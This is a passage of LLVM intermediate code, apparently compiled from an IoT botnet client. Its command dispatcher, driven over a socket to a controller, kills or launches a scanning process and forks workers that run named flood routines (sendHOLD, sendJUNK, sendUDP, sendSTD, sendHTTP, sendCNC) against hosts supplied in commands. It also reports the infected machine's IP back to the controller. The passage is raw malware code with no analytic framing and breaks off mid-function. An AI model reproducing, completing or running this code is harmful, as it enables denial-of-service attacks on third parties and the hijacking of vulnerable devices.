  %64 = load i32, i32* @mainCommSock, align 4
  %65 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %66 = call i8* @inet_ntoa(i32 %65) #12
  %67 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %64, i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.69, i64 0, i64 0), i8* noundef %66)
  br label %815

68:                                               ; preds = %57
  %69 = load i8**, i8*** %4, align 8
  %70 = getelementptr inbounds i8*, i8** %69, i64 0
  %71 = load i8*, i8** %70, align 8
  %72 = call i32 @strcmp(i8* noundef %71, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.70, i64 0, i64 0)) #11
  %73 = icmp ne i32 %72, 0
  br i1 %73, label %120, label %74

74:                                               ; preds = %68
  %75 = load i32, i32* %3, align 4
  %76 = icmp ne i32 %75, 2
  br i1 %76, label %77, label %80

77:                                               ; preds = %74
  %78 = load i32, i32* @mainCommSock, align 4
  %79 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %78, i8* noundef getelementptr inbounds ([17 x i8], [17 x i8]* @.str.71, i64 0, i64 0))
  br label %815

80:                                               ; preds = %74
  %81 = load i8**, i8*** %4, align 8
  %82 = getelementptr inbounds i8*, i8** %81, i64 1
  %83 = load i8*, i8** %82, align 8
  %84 = call i32 @strcmp(i8* noundef %83, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.72, i64 0, i64 0)) #11
  %85 = icmp ne i32 %84, 0
  br i1 %85, label %95, label %86

86:                                               ; preds = %80
  %87 = load i32, i32* @scanPid, align 4
  %88 = icmp eq i32 %87, 0
  br i1 %88, label %89, label %90

89:                                               ; preds = %86
  br label %815

90:                                               ; preds = %86
  %91 = load i32, i32* @scanPid, align 4
  %92 = call i32 @kill(i32 noundef %91, i32 noundef 9) #12
  %93 = load i32, i32* @mainCommSock, align 4
  %94 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %93, i8* noundef getelementptr inbounds ([15 x i8], [15 x i8]* @.str.73, i64 0, i64 0))
  store i32 0, i32* @scanPid, align 4
  br label %95

95:                                               ; preds = %90, %80
  %96 = load i8**, i8*** %4, align 8
  %97 = getelementptr inbounds i8*, i8** %96, i64 1
  %98 = load i8*, i8** %97, align 8
  %99 = call i32 @strcmp(i8* noundef %98, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.74, i64 0, i64 0)) #11
  %100 = icmp ne i32 %99, 0
  br i1 %100, label %119, label %101

101:                                              ; preds = %95
  %102 = load i32, i32* @scanPid, align 4
  %103 = icmp ne i32 %102, 0
  br i1 %103, label %104, label %105

104:                                              ; preds = %101
  br label %815

105:                                              ; preds = %101
  %106 = call i32 @fork() #12
  store i32 %106, i32* %6, align 4
  %107 = load i32, i32* %6, align 4
  %108 = icmp ugt i32 %107, 0
  br i1 %108, label %109, label %111

109:                                              ; preds = %105
  %110 = load i32, i32* %6, align 4
  store i32 %110, i32* @scanPid, align 4
  br label %815

111:                                              ; preds = %105
  %112 = load i32, i32* %6, align 4
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %114, label %115

114:                                              ; preds = %111
  br label %815

115:                                              ; preds = %111
  br label %116

116:                                              ; preds = %115
  %117 = load i32, i32* @mainCommSock, align 4
  %118 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %117, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.75, i64 0, i64 0))
  call void @StartTheLelz()
  call void @_exit(i32 noundef 0) #14
  unreachable

119:                                              ; preds = %95
  br label %120

120:                                              ; preds = %119, %68
  %121 = load i8**, i8*** %4, align 8
  %122 = getelementptr inbounds i8*, i8** %121, i64 0
  %123 = load i8*, i8** %122, align 8
  %124 = call i32 @strcmp(i8* noundef %123, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.76, i64 0, i64 0)) #11
  %125 = icmp ne i32 %124, 0
  br i1 %125, label %182, label %126

126:                                              ; preds = %120
  %127 = load i32, i32* %3, align 4
  %128 = icmp slt i32 %127, 4
  br i1 %128, label %141, label %129

129:                                              ; preds = %126
  %130 = load i8**, i8*** %4, align 8
  %131 = getelementptr inbounds i8*, i8** %130, i64 2
  %132 = load i8*, i8** %131, align 8
  %133 = call i32 @atoi(i8* noundef %132) #11
  %134 = icmp slt i32 %133, 1
  br i1 %134, label %141, label %135

135:                                              ; preds = %129
  %136 = load i8**, i8*** %4, align 8
  %137 = getelementptr inbounds i8*, i8** %136, i64 3
  %138 = load i8*, i8** %137, align 8
  %139 = call i32 @atoi(i8* noundef %138) #11
  %140 = icmp slt i32 %139, 1
  br i1 %140, label %141, label %142

141:                                              ; preds = %135, %129, %126
  br label %815

142:                                              ; preds = %135
  %143 = load i8**, i8*** %4, align 8
  %144 = getelementptr inbounds i8*, i8** %143, i64 1
  %145 = load i8*, i8** %144, align 8
  store i8* %145, i8** %7, align 8
  %146 = load i8**, i8*** %4, align 8
  %147 = getelementptr inbounds i8*, i8** %146, i64 2
  %148 = load i8*, i8** %147, align 8
  %149 = call i32 @atoi(i8* noundef %148) #11
  store i32 %149, i32* %8, align 4
  %150 = load i8**, i8*** %4, align 8
  %151 = getelementptr inbounds i8*, i8** %150, i64 3
  %152 = load i8*, i8** %151, align 8
  %153 = call i32 @atoi(i8* noundef %152) #11
  store i32 %153, i32* %9, align 4
  %154 = load i8*, i8** %7, align 8
  %155 = call i8* @strstr(i8* noundef %154, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #11
  %156 = icmp ne i8* %155, null
  br i1 %156, label %157, label %173

157:                                              ; preds = %142
  %158 = load i8*, i8** %7, align 8
  %159 = call i8* @strtok(i8* noundef %158, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #12
  store i8* %159, i8** %10, align 8
  br label %160

160:                                              ; preds = %170, %157
  %161 = load i8*, i8** %10, align 8
  %162 = icmp ne i8* %161, null
  br i1 %162, label %163, label %172

163:                                              ; preds = %160
  %164 = call i32 @listFork()
  %165 = icmp ne i32 %164, 0
  br i1 %165, label %170, label %166

166:                                              ; preds = %163
  %167 = load i8*, i8** %10, align 8
  %168 = load i32, i32* %8, align 4
  %169 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* noundef %167, i32 noundef %168, i32 noundef %169)
  call void @_exit(i32 noundef 0) #14
  unreachable

170:                                              ; preds = %163
  %171 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #12
  store i8* %171, i8** %10, align 8
  br label %160, !llvm.loop !55

172:                                              ; preds = %160
  br label %181

173:                                              ; preds = %142
  %174 = call i32 @listFork()
  %175 = icmp ne i32 %174, 0
  br i1 %175, label %176, label %177

176:                                              ; preds = %173
  br label %815

177:                                              ; preds = %173
  %178 = load i8*, i8** %7, align 8
  %179 = load i32, i32* %8, align 4
  %180 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* noundef %178, i32 noundef %179, i32 noundef %180)
  call void @_exit(i32 noundef 0) #14
  unreachable

181:                                              ; preds = %172
  br label %182

182:                                              ; preds = %181, %120
  %183 = load i8**, i8*** %4, align 8
  %184 = getelementptr inbounds i8*, i8** %183, i64 0
  %185 = load i8*, i8** %184, align 8
  %186 = call i32 @strcmp(i8* noundef %185, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.77, i64 0, i64 0)) #11
  %187 = icmp ne i32 %186, 0
  br i1 %187, label %246, label %188

188:                                              ; preds = %182
  %189 = load i32, i32* %3, align 4
  %190 = icmp slt i32 %189, 4
  br i1 %190, label %203, label %191

191:                                              ; preds = %188
  %192 = load i8**, i8*** %4, align 8
  %193 = getelementptr inbounds i8*, i8** %192, i64 2
  %194 = load i8*, i8** %193, align 8
  %195 = call i32 @atoi(i8* noundef %194) #11
  %196 = icmp slt i32 %195, 1
  br i1 %196, label %203, label %197

197:                                              ; preds = %191
  %198 = load i8**, i8*** %4, align 8
  %199 = getelementptr inbounds i8*, i8** %198, i64 3
  %200 = load i8*, i8** %199, align 8
  %201 = call i32 @atoi(i8* noundef %200) #11
  %202 = icmp slt i32 %201, 1
  br i1 %202, label %203, label %204

203:                                              ; preds = %197, %191, %188
  br label %815

204:                                              ; preds = %197
  %205 = load i8**, i8*** %4, align 8
  %206 = getelementptr inbounds i8*, i8** %205, i64 1
  %207 = load i8*, i8** %206, align 8
  store i8* %207, i8** %11, align 8
  %208 = load i8**, i8*** %4, align 8
  %209 = getelementptr inbounds i8*, i8** %208, i64 2
  %210 = load i8*, i8** %209, align 8
  %211 = call i32 @atoi(i8* noundef %210) #11
  store i32 %211, i32* %12, align 4
  %212 = load i8**, i8*** %4, align 8
  %213 = getelementptr inbounds i8*, i8** %212, i64 3
  %214 = load i8*, i8** %213, align 8
  %215 = call i32 @atoi(i8* noundef %214) #11
  store i32 %215, i32* %13, align 4
  %216 = load i8*, i8** %11, align 8
  %217 = call i8* @strstr(i8* noundef %216, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #11
  %218 = icmp ne i8* %217, null
  br i1 %218, label %219, label %237

219:                                              ; preds = %204
  %220 = load i8*, i8** %11, align 8
  %221 = call i8* @strtok(i8* noundef %220, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #12
  store i8* %221, i8** %14, align 8
  br label %222

222:                                              ; preds = %234, %219
  %223 = load i8*, i8** %14, align 8
  %224 = icmp ne i8* %223, null
  br i1 %224, label %225, label %236

225:                                              ; preds = %222
  %226 = call i32 @listFork()
  %227 = icmp ne i32 %226, 0
  br i1 %227, label %234, label %228

228:                                              ; preds = %225
  %229 = load i8*, i8** %14, align 8
  %230 = load i32, i32* %12, align 4
  %231 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* noundef %229, i32 noundef %230, i32 noundef %231)
  %232 = load i32, i32* @mainCommSock, align 4
  %233 = call i32 @close(i32 noundef %232)
  call void @_exit(i32 noundef 0) #14
  unreachable

234:                                              ; preds = %225
  %235 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #12
  store i8* %235, i8** %14, align 8
  br label %222, !llvm.loop !56

236:                                              ; preds = %222
  br label %245

237:                                              ; preds = %204
  %238 = call i32 @listFork()
  %239 = icmp ne i32 %238, 0
  br i1 %239, label %240, label %241

240:                                              ; preds = %237
  br label %815

241:                                              ; preds = %237
  %242 = load i8*, i8** %11, align 8
  %243 = load i32, i32* %12, align 4
  %244 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* noundef %242, i32 noundef %243, i32 noundef %244)
  call void @_exit(i32 noundef 0) #14
  unreachable

245:                                              ; preds = %236
  br label %246

246:                                              ; preds = %245, %182
  %247 = load i8**, i8*** %4, align 8
  %248 = getelementptr inbounds i8*, i8** %247, i64 0
  %249 = load i8*, i8** %248, align 8
  %250 = call i32 @strcmp(i8* noundef %249, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.78, i64 0, i64 0)) #11
  %251 = icmp ne i32 %250, 0
  br i1 %251, label %365, label %252

252:                                              ; preds = %246
  %253 = load i32, i32* %3, align 4
  %254 = icmp slt i32 %253, 6
  br i1 %254, label %300, label %255

255:                                              ; preds = %252
  %256 = load i8**, i8*** %4, align 8
  %257 = getelementptr inbounds i8*, i8** %256, i64 3
  %258 = load i8*, i8** %257, align 8
  %259 = call i32 @atoi(i8* noundef %258) #11
  %260 = icmp eq i32 %259, -1
  br i1 %260, label %300, label %261

261:                                              ; preds = %255
  %262 = load i8**, i8*** %4, align 8
  %263 = getelementptr inbounds i8*, i8** %262, i64 2
  %264 = load i8*, i8** %263, align 8
  %265 = call i32 @atoi(i8* noundef %264) #11
  %266 = icmp eq i32 %265, -1
  br i1 %266, label %300, label %267

267:                                              ; preds = %261
  %268 = load i8**, i8*** %4, align 8
  %269 = getelementptr inbounds i8*, i8** %268, i64 4
  %270 = load i8*, i8** %269, align 8
  %271 = call i32 @atoi(i8* noundef %270) #11
  %272 = icmp eq i32 %271, -1
  br i1 %272, label %300, label %273

273:                                              ; preds = %267
  %274 = load i8**, i8*** %4, align 8
  %275 = getelementptr inbounds i8*, i8** %274, i64 5
  %276 = load i8*, i8** %275, align 8
  %277 = call i32 @atoi(i8* noundef %276) #11
  %278 = icmp eq i32 %277, -1
  br i1 %278, label %300, label %279

279:                                              ; preds = %273
  %280 = load i8**, i8*** %4, align 8
  %281 = getelementptr inbounds i8*, i8** %280, i64 5
  %282 = load i8*, i8** %281, align 8
  %283 = call i32 @atoi(i8* noundef %282) #11
  %284 = icmp sgt i32 %283, 65500
  br i1 %284, label %300, label %285

285:                                              ; preds = %279
  %286 = load i8**, i8*** %4, align 8
  %287 = getelementptr inbounds i8*, i8** %286, i64 4
  %288 = load i8*, i8** %287, align 8
  %289 = call i32 @atoi(i8* noundef %288) #11
  %290 = icmp sgt i32 %289, 32
  br i1 %290, label %300, label %291

291:                                              ; preds = %285
  %292 = load i32, i32* %3, align 4
  %293 = icmp eq i32 %292, 7
  br i1 %293, label %294, label %301

294:                                              ; preds = %291
  %295 = load i8**, i8*** %4, align 8
  %296 = getelementptr inbounds i8*, i8** %295, i64 6
  %297 = load i8*, i8** %296, align 8
  %298 = call i32 @atoi(i8* noundef %297) #11
  %299 = icmp slt i32 %298, 1
  br i1 %299, label %300, label %301

300:                                              ; preds = %294, %285, %279, %273, %267, %261, %255, %252
  br label %815

301:                                              ; preds = %294, %291
  %302 = load i8**, i8*** %4, align 8
  %303 = getelementptr inbounds i8*, i8** %302, i64 1
  %304 = load i8*, i8** %303, align 8
  store i8* %304, i8** %15, align 8
  %305 = load i8**, i8*** %4, align 8
  %306 = getelementptr inbounds i8*, i8** %305, i64 2
  %307 = load i8*, i8** %306, align 8
  %308 = call i32 @atoi(i8* noundef %307) #11
  store i32 %308, i32* %16, align 4
  %309 = load i8**, i8*** %4, align 8
  %310 = getelementptr inbounds i8*, i8** %309, i64 3
  %311 = load i8*, i8** %310, align 8
  %312 = call i32 @atoi(i8* noundef %311) #11
  store i32 %312, i32* %17, align 4
  %313 = load i8**, i8*** %4, align 8
  %314 = getelementptr inbounds i8*, i8** %313, i64 4
  %315 = load i8*, i8** %314, align 8
  %316 = call i32 @atoi(i8* noundef %315) #11
  store i32 %316, i32* %18, align 4
  %317 = load i8**, i8*** %4, align 8
  %318 = getelementptr inbounds i8*, i8** %317, i64 5
  %319 = load i8*, i8** %318, align 8
  %320 = call i32 @atoi(i8* noundef %319) #11
  store i32 %320, i32* %19, align 4
  %321 = load i32, i32* %3, align 4
  %322 = icmp eq i32 %321, 7
  br i1 %322, label %323, label %328

323:                                              ; preds = %301
  %324 = load i8**, i8*** %4, align 8
  %325 = getelementptr inbounds i8*, i8** %324, i64 6
  %326 = load i8*, i8** %325, align 8
  %327 = call i32 @atoi(i8* noundef %326) #11
  br label %329

328:                                              ; preds = %301
  br label %329

329:                                              ; preds = %328, %323
  %330 = phi i32 [ %327, %323 ], [ 10, %328 ]
  store i32 %330, i32* %20, align 4
  %331 = load i8*, i8** %15, align 8
  %332 = call i8* @strstr(i8* noundef %331, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #11
  %333 = icmp ne i8* %332, null
  br i1 %333, label %334, label %353

334:                                              ; preds = %329
  %335 = load i8*, i8** %15, align 8
  %336 = call i8* @strtok(i8* noundef %335, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #12
  store i8* %336, i8** %21, align 8
  br label %337

337:                                              ; preds = %350, %334
  %338 = load i8*, i8** %21, align 8
  %339 = icmp ne i8* %338, null
  br i1 %339, label %340, label %352

340:                                              ; preds = %337
  %341 = call i32 @listFork()
  %342 = icmp ne i32 %341, 0
  br i1 %342, label %350, label %343

343:                                              ; preds = %340
  %344 = load i8*, i8** %21, align 8
  %345 = load i32, i32* %16, align 4
  %346 = load i32, i32* %17, align 4
  %347 = load i32, i32* %18, align 4
  %348 = load i32, i32* %19, align 4
  %349 = load i32, i32* %20, align 4
  call void @sendUDP(i8* noundef %344, i32 noundef %345, i32 noundef %346, i32 noundef %347, i32 noundef %348, i32 noundef %349)
  call void @_exit(i32 noundef 0) #14
  unreachable

350:                                              ; preds = %340
  %351 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #12
  store i8* %351, i8** %21, align 8
  br label %337, !llvm.loop !57

352:                                              ; preds = %337
  br label %364

353:                                              ; preds = %329
  %354 = call i32 @listFork()
  %355 = icmp ne i32 %354, 0
  br i1 %355, label %356, label %357

356:                                              ; preds = %353
  br label %815

357:                                              ; preds = %353
  %358 = load i8*, i8** %15, align 8
  %359 = load i32, i32* %16, align 4
  %360 = load i32, i32* %17, align 4
  %361 = load i32, i32* %18, align 4
  %362 = load i32, i32* %19, align 4
  %363 = load i32, i32* %20, align 4
  call void @sendUDP(i8* noundef %358, i32 noundef %359, i32 noundef %360, i32 noundef %361, i32 noundef %362, i32 noundef %363)
  call void @_exit(i32 noundef 0) #14
  unreachable

364:                                              ; preds = %352
  br label %365

365:                                              ; preds = %364, %246
  %366 = load i8**, i8*** %4, align 8
  %367 = getelementptr inbounds i8*, i8** %366, i64 0
  %368 = load i8*, i8** %367, align 8
  %369 = call i32 @strcmp(i8* noundef %368, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.79, i64 0, i64 0)) #11
  %370 = icmp ne i32 %369, 0
  br i1 %370, label %427, label %371

371:                                              ; preds = %365
  %372 = load i32, i32* %3, align 4
  %373 = icmp slt i32 %372, 4
  br i1 %373, label %386, label %374

374:                                              ; preds = %371
  %375 = load i8**, i8*** %4, align 8
  %376 = getelementptr inbounds i8*, i8** %375, i64 2
  %377 = load i8*, i8** %376, align 8
  %378 = call i32 @atoi(i8* noundef %377) #11
  %379 = icmp slt i32 %378, 1
  br i1 %379, label %386, label %380

380:                                              ; preds = %374
  %381 = load i8**, i8*** %4, align 8
  %382 = getelementptr inbounds i8*, i8** %381, i64 3
  %383 = load i8*, i8** %382, align 8
  %384 = call i32 @atoi(i8* noundef %383) #11
  %385 = icmp slt i32 %384, 1
  br i1 %385, label %386, label %387

386:                                              ; preds = %380, %374, %371
  br label %815

387:                                              ; preds = %380
  %388 = load i8**, i8*** %4, align 8
  %389 = getelementptr inbounds i8*, i8** %388, i64 1
  %390 = load i8*, i8** %389, align 8
  store i8* %390, i8** %22, align 8
  %391 = load i8**, i8*** %4, align 8
  %392 = getelementptr inbounds i8*, i8** %391, i64 2
  %393 = load i8*, i8** %392, align 8
  %394 = call i32 @atoi(i8* noundef %393) #11
  store i32 %394, i32* %23, align 4
  %395 = load i8**, i8*** %4, align 8
  %396 = getelementptr inbounds i8*, i8** %395, i64 3
  %397 = load i8*, i8** %396, align 8
  %398 = call i32 @atoi(i8* noundef %397) #11
  store i32 %398, i32* %24, align 4
  %399 = load i8*, i8** %22, align 8
  %400 = call i8* @strstr(i8* noundef %399, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #11
  %401 = icmp ne i8* %400, null
  br i1 %401, label %402, label %418

402:                                              ; preds = %387
  %403 = load i8*, i8** %22, align 8
  %404 = call i8* @strtok(i8* noundef %403, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #12
  store i8* %404, i8** %25, align 8
  br label %405

405:                                              ; preds = %415, %402
  %406 = load i8*, i8** %25, align 8
  %407 = icmp ne i8* %406, null
  br i1 %407, label %408, label %417

408:                                              ; preds = %405
  %409 = call i32 @listFork()
  %410 = icmp ne i32 %409, 0
  br i1 %410, label %415, label %411

411:                                              ; preds = %408
  %412 = load i8*, i8** %25, align 8
  %413 = load i32, i32* %23, align 4
  %414 = load i32, i32* %24, align 4
  call void @sendSTD(i8* noundef %412, i32 noundef %413, i32 noundef %414)
  call void @_exit(i32 noundef 0) #14
  unreachable

415:                                              ; preds = %408
  %416 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #12
  store i8* %416, i8** %25, align 8
  br label %405, !llvm.loop !58

417:                                              ; preds = %405
  br label %426

418:                                              ; preds = %387
  %419 = call i32 @listFork()
  %420 = icmp ne i32 %419, 0
  br i1 %420, label %421, label %422

421:                                              ; preds = %418
  br label %815

422:                                              ; preds = %418
  %423 = load i8*, i8** %22, align 8
  %424 = load i32, i32* %23, align 4
  %425 = load i32, i32* %24, align 4
  call void @sendSTD(i8* noundef %423, i32 noundef %424, i32 noundef %425)
  call void @_exit(i32 noundef 0) #14
  unreachable

426:                                              ; preds = %417
  br label %427

427:                                              ; preds = %426, %365
  %428 = load i8**, i8*** %4, align 8
  %429 = getelementptr inbounds i8*, i8** %428, i64 0
  %430 = load i8*, i8** %429, align 8
  %431 = call i32 @strcmp(i8* noundef %430, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.80, i64 0, i64 0)) #11
  %432 = icmp ne i32 %431, 0
  br i1 %432, label %495, label %433

433:                                              ; preds = %427
  %434 = load i32, i32* %3, align 4
  %435 = icmp slt i32 %434, 3
  br i1 %435, label %442, label %436

436:                                              ; preds = %433
  %437 = load i8**, i8*** %4, align 8
  %438 = getelementptr inbounds i8*, i8** %437, i64 2
  %439 = load i8*, i8** %438, align 8
  %440 = call i32 @atoi(i8* noundef %439) #11
  %441 = icmp slt i32 %440, 1
  br i1 %441, label %442, label %443

442:                                              ; preds = %436, %433
  br label %815

443:                                              ; preds = %436
  %444 = load i8**, i8*** %4, align 8
  %445 = getelementptr inbounds i8*, i8** %444, i64 1
  %446 = load i8*, i8** %445, align 8
  store i8* %446, i8** %26, align 8
  %447 = load i8**, i8*** %4, align 8
  %448 = getelementptr inbounds i8*, i8** %447, i64 2
  %449 = load i8*, i8** %448, align 8
  %450 = call i32 @atoi(i8* noundef %449) #11
  store i32 %450, i32* %27, align 4
  %451 = load i8*, i8** %26, align 8
  %452 = call i8* @strstr(i8* noundef %451, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #11
  %453 = icmp ne i8* %452, null
  br i1 %453, label %454, label %478

454:                                              ; preds = %443
  %455 = load i8*, i8** %26, align 8
  %456 = call i8* @strtok(i8* noundef %455, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #12
  store i8* %456, i8** %28, align 8
  br label %457

457:                                              ; preds = %475, %454
  %458 = load i8*, i8** %28, align 8
  %459 = icmp ne i8* %458, null
  br i1 %459, label %460, label %477

460:                                              ; preds = %457
  %461 = call i32 @listFork()
  %462 = icmp ne i32 %461, 0
  br i1 %462, label %475, label %463

463:                                              ; preds = %460
  store i32 0, i32* %29, align 4
  br label %464

464:                                              ; preds = %467, %463
  %465 = load i32, i32* %29, align 4
  %466 = icmp slt i32 %465, 10
  br i1 %466, label %467, label %472

467:                                              ; preds = %464
  %468 = load i8*, i8** %26, align 8
  %469 = load i32, i32* %27, align 4
  call void @sendHTTP(i8* noundef %468, i32 noundef %469)
  %470 = load i32, i32* %29, align 4
  %471 = add nsw i32 %470, 1
  store i32 %471, i32* %29, align 4
  br label %464, !llvm.loop !59

472:                                              ; preds = %464
  %473 = load i32, i32* @mainCommSock, align 4
  %474 = call i32 @close(i32 noundef %473)
  call void @_exit(i32 noundef 0) #14
  unreachable

475:                                              ; preds = %460
  %476 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #12
  store i8* %476, i8** %28, align 8
  br label %457, !llvm.loop !60

477:                                              ; preds = %457
  br label %494

478:                                              ; preds = %443
  %479 = call i32 @listFork()
  %480 = icmp ne i32 %479, 0
  br i1 %480, label %481, label %482

481:                                              ; preds = %478
  br label %815

482:                                              ; preds = %478
  store i32 0, i32* %30, align 4
  br label %483

483:                                              ; preds = %486, %482
  %484 = load i32, i32* %30, align 4
  %485 = icmp slt i32 %484, 10
  br i1 %485, label %486, label %491

486:                                              ; preds = %483
  %487 = load i8*, i8** %26, align 8
  %488 = load i32, i32* %27, align 4
  call void @sendHTTP(i8* noundef %487, i32 noundef %488)
  %489 = load i32, i32* %30, align 4
  %490 = add nsw i32 %489, 1
  store i32 %490, i32* %30, align 4
  br label %483, !llvm.loop !61

491:                                              ; preds = %483
  %492 = load i32, i32* @mainCommSock, align 4
  %493 = call i32 @close(i32 noundef %492)
  call void @_exit(i32 noundef 0) #14
  unreachable

494:                                              ; preds = %477
  br label %495

495:                                              ; preds = %494, %427
  %496 = load i8**, i8*** %4, align 8
  %497 = getelementptr inbounds i8*, i8** %496, i64 0
  %498 = load i8*, i8** %497, align 8
  %499 = call i32 @strcmp(i8* noundef %498, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.81, i64 0, i64 0)) #11
  %500 = icmp ne i32 %499, 0
  br i1 %500, label %559, label %501

501:                                              ; preds = %495
  %502 = load i32, i32* %3, align 4
  %503 = icmp slt i32 %502, 4
  br i1 %503, label %516, label %504

504:                                              ; preds = %501
  %505 = load i8**, i8*** %4, align 8
  %506 = getelementptr inbounds i8*, i8** %505, i64 2
  %507 = load i8*, i8** %506, align 8
  %508 = call i32 @atoi(i8* noundef %507) #11
  %509 = icmp slt i32 %508, 1
  br i1 %509, label %516, label %510

510:                                              ; preds = %504
  %511 = load i8**, i8*** %4, align 8
  %512 = getelementptr inbounds i8*, i8** %511, i64 3
  %513 = load i8*, i8** %512, align 8
  %514 = call i32 @atoi(i8* noundef %513) #11
  %515 = icmp slt i32 %514, 1
  br i1 %515, label %516, label %517

516:                                              ; preds = %510, %504, %501
  br label %815

517:                                              ; preds = %510
  %518 = load i8**, i8*** %4, align 8
  %519 = getelementptr inbounds i8*, i8** %518, i64 1
  %520 = load i8*, i8** %519, align 8
  store i8* %520, i8** %31, align 8
  %521 = load i8**, i8*** %4, align 8
  %522 = getelementptr inbounds i8*, i8** %521, i64 2
  %523 = load i8*, i8** %522, align 8
  %524 = call i32 @atoi(i8* noundef %523) #11
  store i32 %524, i32* %32, align 4
  %525 = load i8**, i8*** %4, align 8
  %526 = getelementptr inbounds i8*, i8** %525, i64 3
  %527 = load i8*, i8** %526, align 8
  %528 = call i32 @atoi(i8* noundef %527) #11
  store i32 %528, i32* %33, align 4
  %529 = load i8*, i8** %31, align 8
  %530 = call i8* @strstr(i8* noundef %529, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #11
  %531 = icmp ne i8* %530, null
  br i1 %531, label %532, label %550

532:                                              ; preds = %517
  %533 = load i8*, i8** %31, align 8
  %534 = call i8* @strtok(i8* noundef %533, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #12
  store i8* %534, i8** %34, align 8
  br label %535

535:                                              ; preds = %547, %532
  %536 = load i8*, i8** %34, align 8
  %537 = icmp ne i8* %536, null
  br i1 %537, label %538, label %549

538:                                              ; preds = %535
  %539 = call i32 @listFork()
  %540 = icmp ne i32 %539, 0
  br i1 %540, label %547, label %541

541:                                              ; preds = %538
  %542 = load i8*, i8** %34, align 8
  %543 = load i32, i32* %32, align 4
  %544 = load i32, i32* %33, align 4
  call void @sendCNC(i8* noundef %542, i32 noundef %543, i32 noundef %544)
  %545 = load i32, i32* @mainCommSock, align 4
  %546 = call i32 @close(i32 noundef %545)
  call void @_exit(i32 noundef 0) #14
  unreachable

547:                                              ; preds = %538
  %548 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #12
  store i8* %548, i8** %34, align 8
  br label %535, !llvm.loop !62

549:                                              ; preds = %535
  br label %558

550:                                              ; preds = %517
  %551 = call i32 @listFork()
  %552 = icmp ne i32 %551, 0
  br i1 %552, label %553, label %554

553:                                              ; preds = %550
  br label %815

554:                                              ; preds = %550
  %555 = load i8*, i8** %31, align 8
  %556 = load i32, i32* %32, align 4
  %557 = load i32, i32* %33, align 4
  call void @sendCNC(i8* noundef %555, i32 noundef %556, i32 noundef %557)
  call void @_exit(i32 noundef 0) #14
  unreachable

558:                                              ; preds = %549
  br label %559

559:                                              ; preds = %558, %495
  %560 = load i8**, i8*** %4, align 8
  %561 = getelementptr inbounds i8*, i8** %560, i64 0
  %562 = load i8*, i8** %561, align 8
  %563 = call i32 @strcmp(i8* noundef %562, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.82, i64 0, i64 0)) #11
  %564 = icmp ne i32 %563, 0
  br i1 %564, label %629, label %565

565:                                              ; preds = %559
  %566 = load i32, i32* %3, align 4
  %567 = icmp slt i32 %566, 4
  br i1 %567, label %580, label %568

568:                                              ; preds = %565
  %569 = load i8**, i8*** %4, align 8
  %570 = getelementptr inbounds i8*, i8** %569, i64 2
  %571 = load i8*, i8** %570, align 8
  %572 = call i32 @atoi(i8* noundef %571) #11
  %573 = icmp slt i32 %572, 1
  br i1 %573, label %580, label %574

574:                                              ; preds = %568
  %575 = load i8**, i8*** %4, align 8
  %576 = getelementptr inbounds i8*, i8** %575, i64 3
  %577 = load i8*, i8** %576, align 8
  %578 = call i32 @atoi(i8* noundef %577) #11
  %579 = icmp slt i32 %578, 1
  br i1 %579, label %580, label %581

580:                                              ; preds = %574, %568, %565
  br label %815

581:                                              ; preds = %574
  %582 = load i8**, i8*** %4, align 8
